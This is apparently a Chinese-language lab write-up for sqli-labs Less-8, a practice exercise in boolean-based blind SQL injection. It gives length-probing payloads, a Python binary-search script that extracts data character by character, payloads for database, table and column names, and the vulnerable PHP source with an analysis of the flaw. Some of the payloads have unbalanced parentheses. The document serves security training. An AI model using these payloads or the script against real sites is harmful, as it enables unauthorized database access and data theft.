# Less-8 **GET Blind- Boolian- Single Quotes- String**
TAG：GET型注入、布尔型盲注  
此页面的名称很清楚的说明了这是个布尔型盲注  
构造一个用于探测数据库名长度的语句  
payload:```?id=1' and length(database())=7--+```  
![less8_1](images/Less8_1.png)

payload:```?id=1' and length(database())=8--+```  
![less8_2](images/Less8_2.png)
通过页面的回显（显示You are in.......与不显示）可以很轻松（并不）的进行手工盲注  
通常情况下，使用python脚本来进行布尔型盲注
```
import requests
url = "http://192.168.232.130/Less-8/?id=1' and ascii(substr((select database()),{_},1))>{__}--+"
#注意一下这里使用>去作为判断条件

flag = ''

for  i  in range(1,15):  #循环次数根据所探测数据
    min = 65
    max = 122
    while abs(max - min) > 1:
        mid = (max + min)//2
        payload = url.format(_=i,__ = mid)
        html = requests.get(payload)
        print(payload)
        if 'You are in...........' in html.text:
            min = mid
        else:
            max = mid

    flag += chr(max)
    print(flag)
```
通过替换这个脚本的payload来获取数据库信息  
数据库名:  
```?id=1' and (ascii(substr((select(database())),{_},1))>{__})--+```  
数据表名:  
```?id=1' and (ascii((substr(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{_},1))>{__})--+```  
数据列名:  
```?id=1' and  (ascii(substr(group_concat(column_name))from(information_schema.columns)where(table_name='Flaaaaag')),{_},1))>{__})--+```  

## 源码分析  
### less8源码：  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-8 Blind- Boolian- Single Quotes- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	//echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>

</font> </div></br></br></br><center>
<img src="../images/Less-8.jpg" /></center>
</body>
</html>
```

### 漏洞点分析：  
通过阅读less8的代码，可以发现，页面并不会显示数据库操作的结果与错误信息，只会显示数据库查询成功与否（显示You are in.......与不显示），这就是通常所说的布尔型盲注  
要进行布尔型盲注需要构造可以产生布尔型结果的数据库查询语句  
这样就需要大量的试错行为来获取信息，非常的消耗时间和精力，特别是在数据库内容过多，字段过长时  
因此要编写盲注脚本来进行自动化的盲注测试，必要时会使用二分法与多线程技术来加快盲注过程  